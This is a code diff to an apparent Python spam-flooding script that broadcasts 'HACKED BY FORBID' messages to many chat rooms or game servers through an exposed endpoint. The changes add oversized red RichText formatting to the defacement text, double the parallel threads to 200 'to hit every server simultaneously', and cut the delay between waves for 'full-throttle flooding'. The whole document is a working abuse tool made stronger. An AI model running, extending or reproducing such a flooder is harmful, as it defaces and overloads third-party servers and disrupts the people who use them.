@@ -8,17 +8,17 @@ headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Label-Fix Broadcaster Engaged...")
+print("[FORBID] Ultimate Nuclear Broadcaster Fully Engaged...")
 
 session = requests.Session()
 
 def blast_room(room_url):
     try:
-        # Including multiple common key variants so the Lua script grabs the text correctly
+        # Massive RichText formatting for oversized, prominent alerts
         payload = {
-            "Sender": "FORBID",
-            "Message": "HACKED BY FORBID | DISCORD: forbiddenway",
-            "Text": "HACKED BY FORBID | DISCORD: forbiddenway",
+            "Sender": "<b><font size='28' color='#FF0000'>FORBID</font></b>",
+            "Message": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
+            "Text": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
             "Timestamp": int(time.time() * 1000),
             "Aura": "voidWings",
             "Color": "red"
@@ -41,11 +41,13 @@ while True:
                 ]
                 
                 if room_urls:
-                    with ThreadPoolExecutor(max_workers=100) as executor:
+                    # Maximum parallel threads to hit every server simultaneously
+                    with ThreadPoolExecutor(max_workers=200) as executor:
                         executor.map(blast_room, room_urls)
-                    print(f"[FORBID] Clean spam wave delivered to {len(room_urls)} rooms!")
+                    print(f"[FORBID] Mega-blast wave delivered to {len(room_urls)} active servers!")
                     
     except Exception as e:
         print(f"[FORBID] Loop error: {e}")
         
-    time.sleep(0.02)
+    # Zero delay for continuous full-throttle flooding
+    time.sleep(0.01)
